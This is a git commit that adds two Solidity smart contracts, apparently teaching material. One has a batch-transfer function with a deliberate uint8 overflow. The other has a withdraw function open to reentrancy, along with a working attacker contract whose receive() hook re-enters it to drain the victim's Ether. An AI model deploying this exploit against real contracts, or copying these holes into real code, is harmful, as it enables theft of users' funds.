26b41daa9052fff02c9acbd2198c94234d33a022
Purinut <reawjangpurinut@gmail.com>
2022-05-22 21:51:04 +0700

    finish Smart contract part

---
+++ smart-contracts/contracts/Arithmetic.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity 0.5.0;
+
+contract Arithmetic {
+    mapping(address => uint256) public balances;
+    address public receiver; //fix address of receiver 
+
+    constructor() public {
+        receiver = 0x3D4C1dC19fFAC9D07A541b6F01B1d0Cd150C1626;
+    }
+
+    function deposit() public payable{
+        balances[msg.sender] += msg.value;
+    }
+
+    function batchTransfer(uint cnt, uint8 _value) public returns (uint8) {
+        uint8 amount = uint8(cnt) * _value;
+        require(cnt > 0 && cnt <= 20, "Count error");
+        require(_value > 0 && balances[msg.sender] >= amount, "Aount error");
+        balances[msg.sender] = balances[msg.sender] - amount;//-4X
+        for (uint i=0; i < cnt; i++) {
+            balances[receiver] = balances[receiver] + _value;//100
+            //address(receiver).call.value(_value);
+        }
+        return amount;
+    }
+}
---
+++ smart-contracts/contracts/Reentrancy.sol
@@ -0,0 +1,50 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.13;
+
+contract ReentrancyVuln {
+    uint constant public WITHDRAW_LIMIT = 1 ether;
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable{
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract ReentrancyAttack {
+    ReentrancyVuln public reentrancyVuln;
+
+    constructor(address _address) {
+        reentrancyVuln = ReentrancyVuln(_address);
+    }
+
+    receive() external payable {
+        if (address(reentrancyVuln).balance >= 1 ether) {
+            reentrancyVuln.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "No provided ether");
+        reentrancyVuln.deposit{value: msg.value}();
+        reentrancyVuln.withdraw();
+    }
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+}
